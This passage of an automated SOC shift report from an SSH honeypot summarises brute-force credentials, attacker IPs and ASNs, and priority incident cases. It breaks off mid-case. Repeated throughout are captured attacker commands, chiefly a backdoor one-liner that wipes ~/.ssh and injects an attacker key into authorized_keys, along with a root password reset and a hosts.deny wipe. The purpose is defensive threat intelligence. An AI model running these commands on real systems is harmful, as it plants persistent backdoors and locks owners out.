# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-16 |
| **Generated At** | 2026-04-16T19:23:02Z |
| **Shift Time** | 19:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **83** |
| Confirmed Threats | **54** |
| False Positives Filtered | **29** (34.9%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **13** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **58** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **45** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **11** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `345gs5662d34` | 11 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36` | 1 |
| `Accept-Encoding: gzip` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 12 |
| `345gs5662d34` | 11 |
| `qazQAZ123!@#` | 2 |
| `Host: 13.235.92.17:23` | 1 |
| `Accept: */*` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 12 |
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `qazQAZ123!@#` | 2 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36` | `Accept: */*` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `yj123456.` | `222.107.156.227` | 2026-04-16T18:43:43 |
| `root` | `3245gs5662d34` | `222.107.156.227` | 2026-04-16T18:43:46 |
| `root` | `root123123!@` | `209.14.88.118` | 2026-04-16T18:44:32 |
| `root` | `3245gs5662d34` | `209.14.88.118` | 2026-04-16T18:44:40 |
| `root` | `XXcc112233` | `103.23.199.119` | 2026-04-16T18:45:27 |
| `root` | `3245gs5662d34` | `103.23.199.119` | 2026-04-16T18:45:32 |
| `root` | `qazQAZ123!@#` | `152.32.130.144` | 2026-04-16T18:46:29 |
| `root` | `3245gs5662d34` | `152.32.130.144` | 2026-04-16T18:46:33 |
| `root` | `linux@2026` | `165.154.205.128` | 2026-04-16T18:46:52 |
| `root` | `3245gs5662d34` | `165.154.205.128` | 2026-04-16T18:46:54 |
| `root` | `qwertyqwerty` | `43.130.90.166` | 2026-04-16T18:48:17 |
| `root` | `3245gs5662d34` | `43.130.90.166` | 2026-04-16T18:48:23 |
| `root` | `Admin123456789` | `172.174.17.234` | 2026-04-16T18:52:26 |
| `root` | `3245gs5662d34` | `172.174.17.234` | 2026-04-16T18:52:46 |
| `root` | `qazQAZ123!@#` | `172.174.17.234` | 2026-04-16T18:56:39 |
| `root` | `Root2018!` | `172.174.17.234` | 2026-04-16T19:00:45 |
| `root` | `QWEasd123!` | `172.174.17.234` | 2026-04-16T19:04:40 |
| `root` | `QWER123` | `172.174.17.234` | 2026-04-16T19:16:50 |
| `root` | `Aa123b` | `101.126.141.34` | 2026-04-16T19:21:27 |
| `root` | `123456@Ab` | `43.227.185.238` | 2026-04-16T19:21:57 |
| `root` | `3245gs5662d34` | `43.227.185.238` | 2026-04-16T19:21:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **83** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 46 |
| Unknown | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 46 | 13 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 46 | 13 | Modern SSH client |
| `95420f9d932d...` | Unknown | 4 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Ws3xolYofASl"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.141.34`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `222.107.156.227`, `209.14.88.118`, `172.174.17.234`, `43.227.185.238`, `152.32.130.144`, `43.130.90.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS213790` | Limited Network LTD | 2 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS272786` | X99 INTERNET | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-27256e4c28d3

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-04-16 18:43 |
| **Last Seen** | 2026-04-16 18:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:43:42` | `cowrie.session.connect` |
| `2026-04-16 18:43:42` | `cowrie.client.version` |
| `2026-04-16 18:43:42` | `cowrie.client.kex` |
| `2026-04-16 18:43:43` | `cowrie.login.success` |
| `2026-04-16 18:43:43` | `cowrie.session.params` |
| `2026-04-16 18:43:43` | `cowrie.command.input` |
| `2026-04-16 18:43:43` | `cowrie.command.failed` |
| `2026-04-16 18:43:43` | `cowrie.log.closed` |
| `2026-04-16 18:43:44` | `cowrie.session.params` |
| `2026-04-16 18:43:44` | `cowrie.command.input` |
| `2026-04-16 18:43:44` | `cowrie.session.file_download` |
| `2026-04-16 18:43:44` | `cowrie.log.closed` |
| `2026-04-16 18:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0158f87618cc

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-04-16 18:43 |
| **Last Seen** | 2026-04-16 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:43:46` | `cowrie.session.connect` |
| `2026-04-16 18:43:46` | `cowrie.client.version` |
| `2026-04-16 18:43:46` | `cowrie.client.kex` |
| `2026-04-16 18:43:46` | `cowrie.login.success` |
| `2026-04-16 18:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e28f5cde9ac

| Field | Detail |
|---|---|
| **Source IP** | `209.14.88[.]118` |
| **First Seen** | 2026-04-16 18:44 |
| **Last Seen** | 2026-04-16 18:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:44:31` | `cowrie.session.connect` |
| `2026-04-16 18:44:31` | `cowrie.client.version` |
| `2026-04-16 18:44:31` | `cowrie.client.kex` |
| `2026-04-16 18:44:32` | `cowrie.login.success` |
| `2026-04-16 18:44:33` | `cowrie.session.params` |
| `2026-04-16 18:44:33` | `cowrie.command.input` |
| `2026-04-16 18:44:33` | `cowrie.command.failed` |
| `2026-04-16 18:44:33` | `cowrie.log.closed` |
| `2026-04-16 18:44:34` | `cowrie.session.params` |
| `2026-04-16 18:44:34` | `cowrie.command.input` |
| `2026-04-16 18:44:34` | `cowrie.session.file_download` |
| `2026-04-16 18:44:34` | `cowrie.log.closed` |
| `2026-04-16 18:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.14.88[.]118` to AbuseIPDB if not already reported
- [ ] Block `209.14.88[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4fbc6be7e58

| Field | Detail |
|---|---|
| **Source IP** | `209.14.88[.]118` |
| **First Seen** | 2026-04-16 18:44 |
| **Last Seen** | 2026-04-16 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:44:38` | `cowrie.session.connect` |
| `2026-04-16 18:44:38` | `cowrie.client.version` |
| `2026-04-16 18:44:38` | `cowrie.client.kex` |
| `2026-04-16 18:44:40` | `cowrie.login.success` |
| `2026-04-16 18:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.14.88[.]118` to AbuseIPDB if not already reported
- [ ] Block `209.14.88[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6bc48efb67

| Field | Detail |
|---|---|
| **Source IP** | `103.23.199[.]119` |
| **First Seen** | 2026-04-16 18:45 |
| **Last Seen** | 2026-04-16 18:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:45:26` | `cowrie.session.connect` |
| `2026-04-16 18:45:26` | `cowrie.client.version` |
| `2026-04-16 18:45:26` | `cowrie.client.kex` |
| `2026-04-16 18:45:27` | `cowrie.login.success` |
| `2026-04-16 18:45:27` | `cowrie.session.params` |
| `2026-04-16 18:45:27` | `cowrie.command.input` |
| `2026-04-16 18:45:27` | `cowrie.command.failed` |
| `2026-04-16 18:45:28` | `cowrie.log.closed` |
| `2026-04-16 18:45:28` | `cowrie.session.params` |
| `2026-04-16 18:45:28` | `cowrie.command.input` |
| `2026-04-16 18:45:28` | `cowrie.session.file_download` |
| `2026-04-16 18:45:28` | `cowrie.log.closed` |
| `2026-04-16 18:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.199[.]119` to AbuseIPDB if not already reported
- [ ] Block `103.23.199[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96d491844c3

| Field | Detail |
|---|---|
| **Source IP** | `103.23.199[.]119` |
| **First Seen** | 2026-04-16 18:45 |
| **Last Seen** | 2026-04-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:45:31` | `cowrie.session.connect` |
| `2026-04-16 18:45:31` | `cowrie.client.version` |
| `2026-04-16 18:45:31` | `cowrie.client.kex` |
| `2026-04-16 18:45:32` | `cowrie.login.success` |
| `2026-04-16 18:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.199[.]119` to AbuseIPDB if not already reported
- [ ] Block `103.23.199[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774ce4c61f76

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-04-16 18:46 |
| **Last Seen** | 2026-04-16 18:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:46:28` | `cowrie.session.connect` |
| `2026-04-16 18:46:28` | `cowrie.client.version` |
| `2026-04-16 18:46:29` | `cowrie.client.kex` |
| `2026-04-16 18:46:29` | `cowrie.login.success` |
| `2026-04-16 18:46:29` | `cowrie.session.params` |
| `2026-04-16 18:46:29` | `cowrie.command.input` |
| `2026-04-16 18:46:29` | `cowrie.command.failed` |
| `2026-04-16 18:46:29` | `cowrie.log.closed` |
| `2026-04-16 18:46:30` | `cowrie.session.params` |
| `2026-04-16 18:46:30` | `cowrie.command.input` |
| `2026-04-16 18:46:30` | `cowrie.session.file_download` |
| `2026-04-16 18:46:30` | `cowrie.log.closed` |
| `2026-04-16 18:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3be170ae73

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-04-16 18:46 |
| **Last Seen** | 2026-04-16 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:46:32` | `cowrie.session.connect` |
| `2026-04-16 18:46:32` | `cowrie.client.version` |
| `2026-04-16 18:46:32` | `cowrie.client.kex` |
| `2026-04-16 18:46:33` | `cowrie.login.success` |
| `2026-04-16 18:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8f6f27fbe5

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-04-16 18:46 |
| **Last Seen** | 2026-04-16 18:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:46:51` | `cowrie.session.connect` |
| `2026-04-16 18:46:51` | `cowrie.client.version` |
| `2026-04-16 18:46:51` | `cowrie.client.kex` |
| `2026-04-16 18:46:52` | `cowrie.login.success` |
| `2026-04-16 18:46:52` | `cowrie.session.params` |
| `2026-04-16 18:46:52` | `cowrie.command.input` |
| `2026-04-16 18:46:52` | `cowrie.command.failed` |
| `2026-04-16 18:46:52` | `cowrie.log.closed` |
| `2026-04-16 18:46:52` | `cowrie.session.params` |
| `2026-04-16 18:46:52` | `cowrie.command.input` |
| `2026-04-16 18:46:52` | `cowrie.session.file_download` |
| `2026-04-16 18:46:52` | `cowrie.log.closed` |
| `2026-04-16 18:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715548e04bda

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-04-16 18:46 |
| **Last Seen** | 2026-04-16 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:46:54` | `cowrie.session.connect` |
| `2026-04-16 18:46:54` | `cowrie.client.version` |
| `2026-04-16 18:46:54` | `cowrie.client.kex` |
| `2026-04-16 18:46:54` | `cowrie.login.success` |
| `2026-04-16 18:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c4dace1727

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-16 18:48 |
| **Last Seen** | 2026-04-16 18:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:48:16` | `cowrie.session.connect` |
| `2026-04-16 18:48:16` | `cowrie.client.version` |
| `2026-04-16 18:48:16` | `cowrie.client.kex` |
| `2026-04-16 18:48:17` | `cowrie.login.success` |
| `2026-04-16 18:48:18` | `cowrie.session.params` |
| `2026-04-16 18:48:18` | `cowrie.command.input` |
| `2026-04-16 18:48:18` | `cowrie.command.failed` |
| `2026-04-16 18:48:18` | `cowrie.log.closed` |
| `2026-04-16 18:48:18` | `cowrie.session.params` |
| `2026-04-16 18:48:18` | `cowrie.command.input` |
| `2026-04-16 18:48:19` | `cowrie.session.file_download` |
| `2026-04-16 18:48:19` | `cowrie.log.closed` |
| `2026-04-16 18:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda751800bfb

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-16 18:48 |
| **Last Seen** | 2026-04-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:48:22` | `cowrie.session.connect` |
| `2026-04-16 18:48:22` | `cowrie.client.version` |
| `2026-04-16 18:48:22` | `cowrie.client.kex` |
| `2026-04-16 18:48:23` | `cowrie.login.success` |
| `2026-04-16 18:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02672545dee

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 18:52 |
